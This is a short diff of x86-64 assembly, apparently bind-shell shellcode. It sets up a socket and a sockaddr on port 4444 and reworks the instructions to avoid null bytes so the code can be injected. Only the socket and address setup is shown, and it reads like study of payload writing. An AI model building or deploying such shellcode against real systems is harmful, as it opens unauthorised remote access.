@@ -7,6 +7,7 @@ _start:
 	; SOCK_STREAM = 1
 	; syscall number 41 
 
+    ; To prevent nullbytes I used the push pop technique
     push 41
     pop rax
     push 2
@@ -25,10 +26,11 @@ _start:
 	; server.sin_addr.s_addr = INADDR_ANY
 	; bzero(&server.sin_zero, 8)
 
+    push rdx ; sin_zero
+    add dx, 0x5c11  
+    shl rdx, 16
+    add rdx, 2
     push rdx
-    push rdx
-    mov byte [rsp], 2
-    mov word [rsp + 2], 0x5c11
     push rsp
     pop rsi
 
